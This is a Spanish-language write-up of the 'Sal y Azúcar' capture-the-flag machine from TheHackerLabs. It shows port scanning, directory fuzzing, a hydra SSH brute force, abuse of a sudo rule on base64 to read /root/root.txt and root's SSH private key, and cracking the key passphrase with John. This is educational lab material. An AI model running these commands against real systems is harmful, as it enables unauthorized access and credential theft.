---
title: "Sal y Azúcar - TheHackerLabs"
date: 2025-06-06
draft: false
slug: "THL-writeup-salYazucar"
excerpt: "Esta fue una máquina sencilla. Después de aplicar Fuzzing, encontramos un directorio oculto. Dicho directorio, solamente tiene un archivo que muestra un mensaje que nos da una pista de lo que tenemos que hacer. Aplicamos fuerza bruta al servicio SSH, encontrando un usuario y contraseña válidos con los que podemos ganar acceso a la máquina víctima. Dentro de la máquina, revisamos los privilegios de nuestro usuario, descubriendo que podemos utilizar el binario base64 como Root. Utilizamos la guía de GTFOBins para encontrar una forma de escalar privilegios con este binario. Encontramos que el binario base64 nos permite ver archivos que solamente el Root puede, siendo de esta forma que logramos copiar la llave privada id_rsa. Logramos crackear la llave privada y nos autenticamos como Root en la máquina víctima."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Web Enumeration", "Fuzzing", "Brute Force Attack", "Cracking Hash", "Cracking SSH Private Key", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ffuf"
  - "gobuster"
  - "hydra"
  - "ssh"
  - "sudo"
  - "base64"
  - "ssh2john"
  - "JohnTheRipper"
  - "chmod"
links:
  - "https://gtfobins.github.io/gtfobins/base64/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-salYazucar/salYazucar.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.90
PING 192.168.10.90 (192.168.10.90) 56(84) bytes of data.
64 bytes from 192.168.10.90: icmp_seq=1 ttl=64 time=1.86 ms
64 bytes from 192.168.10.90: icmp_seq=2 ttl=64 time=1.16 ms
64 bytes from 192.168.10.90: icmp_seq=3 ttl=64 time=0.561 ms
64 bytes from 192.168.10.90: icmp_seq=4 ttl=64 time=0.930 ms

--- 192.168.10.90 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3188ms
rtt min/avg/max/mdev = 0.561/1.127/1.861/0.474 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.90 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 11:32 CST
Initiating ARP Ping Scan at 11:32
Scanning 192.168.10.90 [1 port]
Completed ARP Ping Scan at 11:32, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:32
Scanning 192.168.10.90 [65535 ports]
Discovered open port 80/tcp on 192.168.10.90
Discovered open port 22/tcp on 192.168.10.90
Completed SYN Stealth Scan at 11:32, 16.41s elapsed (65535 total ports)
Nmap scan report for 192.168.10.90
Host is up, received arp-response (0.0011s latency).
Scanned at 2025-06-06 11:32:13 CST for 16s
Not shown: 57919 closed tcp ports (reset), 7614 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
           Raw packets sent: 94157 (4.143MB) | Rcvd: 57924 (2.317MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay dos puertos abiertos, pues supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.90 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 11:33 CST
Nmap scan report for 192.168.10.90
Host is up (0.00066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que la página web activa solamente está mostrando la página por defecto de **Apache2**.

Al analizar el código fuente de la página, en busca de alguna pista que nos ayude, no encontraremos nada.

Por lo que vamos a aplicar **Fuzzing** para ver si encontramos algún directorio oculto.

## Análisis de Vulnerabilidades {#Analisis}

### Fuzzing {#fuzz}

Primero, probemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt:FUZZ -u http://192.168.10.90/FUZZ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.90/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

summary                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 7ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 18ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 341ms]
:: Progress: [1185240/1185240] :: Job [1/1] :: 253 req/sec :: Duration: [0:15:50] :: Errors: 506 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probamos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.90/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.90/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/summary              (Status: 301) [Size: 318] [--> http://192.168.10.90/summary/]
/server-status        (Status: 403) [Size: 279]
Progress: 1185240 / 1185241 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Solamente hay un directorio y al entrar, encontraremos un archivo llamado **summary.html**:

<p align="center">
<img src="/assets/images/THL-writeup-salYazucar/Captura1.png">
</p>

Pero, únicamente nos mostrará un mensaje esa página:

<p align="center">
<img src="/assets/images/THL-writeup-salYazucar/Captura2.png">
</p>

Quiero pensar que hay una contraseña por defecto o una muy vulnerable.

Pero como no tenemos ni una otra pista más que esta, vamos a aplicar fuerza bruta al **servicio SSH** activo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta al Servicio SSH y Ganando Acceso a la Máquina Víctima {#FuerzaBruta}

Como no tenemos un usuario al que le podamos aplicar fuerza bruta, vamos a utilizar un wordlist de usuarios para aplicar la fuerza bruta.

Utilizaremos la herramienta **hydra** para esto:
```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.90
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 11:50:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118993316406545 login tries (l:8295455/p:14344399), ~7437082275410 tries per task
[DATA] attacking ssh://192.168.10.90:22/
[22][ssh] host: 192.168.10.90   login: info   password: ******
[STATUS] 14344681.00 tries/min, 14344681 tries in 00:01h, 118993302061864 to do in 138254:51h, 16 active
[STATUS] 4781741.33 tries/min, 14345224 tries in 00:03h, 118993302061322 to do in 414748:51h, 15 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
Bastante vulnerable esa contraseña.

Comprobemos si son válidos ese usuario y contraseña:
```bash
ssh info@192.168.10.90
info@192.168.10.90's password: 
Linux salyazucar 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
...
Last login: Fri Jun  6 19:51:12 2025
Could not chdir to home directory /home/NULL: No such file or directory
info@salyazucar:/$ whoami
info
```
Curiosamente, estamos en la raíz, más no en el directorio del **usuario info**.

Busquemos la flag:
```bash
info@salyazucar:/$ cd /home/info
info@salyazucar:/home/info$ cat user.txt
...
```

## Post Explotación {#Post}

### Escalando Privilegios Robando la Llave Privada del Servicio SSH con Binario base64 {#base64}

Veamos qué privilegios tiene nuestro usuario:
```bash
info@salyazucar:/home/info$ sudo -l
Matching Defaults entries for info on salyazucar:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User info may run the following commands on salyazucar:
    (root) NOPASSWD: /usr/bin/base64
```
Excelente, podemos usar el binario **base64** como **Root**.

Al buscar en la **guía de GTFOBins**, encontramos una forma de abusar de este binario para escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/base64/" target="_blank">GTFOBIns: base64</a> 

Aquí la muestro:

<p align="center">
<img src="/assets/images/THL-writeup-salYazucar/Captura3.png">
</p>

Prácticamente, podemos codificar y decodificar cualquier archivo en **base64**, siendo posible leer su contenido.

Por ejemplo, sabemos que existe la flag del **Root** dentro de un archivo que se llama **root.txt** y se encuentra en el directorio del **Root**.

Entonces, vamos a utilizar la ruta de este archivo para poder leerlo:
```bash
info@salyazucar:/home/info$ LFILE=/root/root.txt
info@salyazucar:/home/info$ sudo base64 "$LFILE" | base64 --decode
...
```
Funcionó.

Digamos que existe una llave privada dentro del directorio `/root/.ssh`.

Si existe, podemos obtenerla de la misma forma que obtuvimos la flag del **Root**:
```bash
info@salyazucar:/home/info$ LFILE=/root/.ssh/id_rsa
info@salyazucar:/home/info$ sudo base64 "$LFILE" | base64 --decode
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAYM4t5Uq
...
```
Muy bien, tenemos la **llave privada id_rsa**. Cópiala y guárdala en tu máquina con el nombre **id_rsa**.

Vamos a crackearla para obtener la frase usada en esta llave.

Primero, obtengamos el hash de esta llave con la herramienta **ssh2john** y lo guardamos en un archivo:
```bash
ssh2john id_rsa > hash
```

Ahora, lo crackeamos con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash_idRsa
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******           (hash)     
1g 0:00:01:54 DONE (2025-06-06 11:57) 0.008706g/s 30.92p/s 30.92c/s 30.92C/s Password1..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Genial, tenemos la frase.

Para usar la llave, tenemos que asignarle los permisos correctos con **chmod**:
```bash
chmod 600 id_rsa
```

Y la utilizamos para autenticarnos como **Root**:
```bash
ssh -i id_rsa root@192.168.10.90
Enter passphrase for key 'id_rsa': 
Linux salyazucar 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
...
Last login: Tue May 21 12:11:33 2024
root@salyazucar:~# whoami
root
```
Listo, ya somos **Root**.

Podemos obtener otra vez la última flag:
```bash
root@salyazucar:~# ls
root.txt
root@salyazucar:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
